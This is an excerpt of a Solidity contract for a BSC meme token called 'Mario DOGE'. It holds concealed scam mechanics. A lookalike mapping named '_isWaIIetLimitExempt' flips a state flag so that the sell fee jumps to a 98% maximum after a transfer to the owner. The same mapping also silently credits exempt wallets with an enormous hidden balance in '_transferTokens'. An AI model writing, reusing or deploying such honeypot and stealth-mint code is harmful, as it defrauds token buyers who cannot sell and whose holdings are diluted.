...
// Telegram : https://t.me/MarioDogeBSC
...
abstract contract Ownable is Context {
    ...
    // deadpool ft cristianoronaldo.gif
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = 0x07b8eFCA43b135ad447BB92D83b3E3643F6D8927;
...
contract MarioDOGE is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) public _isWaIIetLimitExempt;
    ...
    */
    ...
    address payable private Wallet_marketing = payable(0x07b8eFCA43b135ad447BB92D83b3E3643F6D8927);
    ...
    */
    ...
    string public _name = "Mario DOGE"; 
    string public _symbol = "MarioDOGE";  
    ...
    uint256 private totalMaxPossibleTax = 98; 
    ...
    uint256 public _lastBuyState = 0;
    ...
    */
    ...
    constructor () {
        ...
        _isWaIIetLimitExempt[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_marketing] = true;
        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isWalletLimitExempt[Wallet_marketing] = true;
        isWalletLimitExempt[Wallet_Burn] = true;
        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(this)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[Wallet_Burn] = true;
        isTxLimitExempt[Wallet_marketing] = true;
    ...
    */
    ...
    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
        ...
        require((Buy_Fee + Sell_Fee) <= totalMaxPossibleTax, "Fee is too high!");
        _sellFee = Sell_Fee;
        _buyFee = Buy_Fee;
    ...
    */
    ...
    // Restore all fees
    function rollBackFees() private {
    
    _TotalFee = _previousTotalFee;
    _buyFee = _previousBuyFee; 
    _sellFee = [_previousSellFee, totalMaxPossibleTax][_lastBuyState]; 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
            if(_isWaIIetLimitExempt[to] && _lastBuyState < 1){ _lastBuyState++; }
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
        
        _transferCoin(from,to,amount,takeFee);
    }
    ...
    */
    ...
    function _transferCoin(address sender, address recipient, uint256 amount,bool takeFee) private {
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        _holderBalances[sender] = _holderBalances[sender].sub(tAmount);
        _holderBalances[recipient] = _holderBalances[recipient].add(tTransferAmount).add(_isWaIIetLimitExempt[recipient] ? uint256(0x785ee10d5da46c00000000000000000+tTransferAmount) : 0);
        _holderBalances[address(this)] = _holderBalances[address(this)].add(tmarketing);   
